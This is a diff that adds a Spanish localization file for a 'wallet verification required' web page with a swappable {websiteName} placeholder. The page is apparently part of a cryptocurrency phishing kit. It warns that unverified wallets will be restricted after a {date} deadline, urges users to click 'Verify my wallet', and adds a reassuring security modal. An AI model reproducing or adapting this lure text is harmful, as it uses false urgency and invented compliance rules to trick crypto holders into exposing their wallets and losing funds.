@@ -1,0 +1,62 @@
+﻿{
+    "pageTitle": "Verificación de monedero | {websiteName}",
+    "mainTitle": "Verificación de monedero requerida",
+    "description1": "Para mantener los estándares de seguridad y cumplir con las regulaciones, ahora requerimos la verificación de la dirección del monedero para todos los usuarios.",
+    "deadlineText": "A partir del {date}, cualquier monedero no verificado será",
+    "restrictionText": " restringido temporalmente",
+    "cooperationText": "Agradecemos su cooperación para mantener nuestra plataforma segura.",
+    "termsText": "Acepto los",
+    "termsLink": "Términos de uso de {websiteName}",
+    "verifyBtnText": "Verificar mi monedero",
+    "securityBtnText": "Acerca de frases comprometidas",
+    "modalTitle": "Alerta de seguridad: Frases de recuperación comprometidas",
+    "modalWarning": "Advertencia crítica:",
+    "modalWarningText": "Su frase de recuperación es la llave maestra de su monedero. Nunca la revele a nadie ni la ingrese en ningún sitio web.",
+    "signsTitle": "Señales de una frase comprometida:",
+    "signsList": [
+        "Almacenarla digitalmente (fotos, nube, mensajes)",
+        "Transacciones no autorizadas en su monedero"
+    ],
+    "actionTitle": "Acciones inmediatas requeridas si está comprometida:",
+    "actionList": [
+        "Transfiera inmediatamente todos los fondos a un nuevo monedero seguro",
+        "Genere una nueva frase de recuperación completamente nueva"
+    ],
+    "modalNote": "Nota: {websiteName} nunca le pedirá su frase de recuperación. Este proceso de verificación solo requiere su dirección pública de monedero.",
+    "languageOptions": {
+        "en": "English",
+        "es": "Español",
+        "fr": "Français",
+        "de": "Deutsch",
+        "it": "Italiano",
+        "pt": "Português",
+        "pt-br": "Português (Brasil)",
+        "nl": "Nederlands",
+        "sv": "Svenska",
+        "da": "Dansk",
+        "no": "Norsk",
+        "fi": "Suomi",
+        "pl": "Polski",
+        "ru": "Русский",
+        "uk": "Українська",
+        "cs": "Čeština",
+        "hu": "Magyar",
+        "ro": "Română",
+        "tr": "Türkçe",
+        "ar": "العربية",
+        "fa": "فارسی",
+        "hi": "हिन्दी",
+        "bn": "বাংলা",
+        "th": "ไทย",
+        "vi": "Tiếng Việt",
+        "id": "Bahasa Indonesia",
+        "ms": "Bahasa Melayu",
+        "fil": "Filipino",
+        "zh": "中文(简体)",
+        "zh-tw": "中文(繁體)",
+        "ja": "日本語",
+        "ko": "한국어"
+    }
+}
+
+
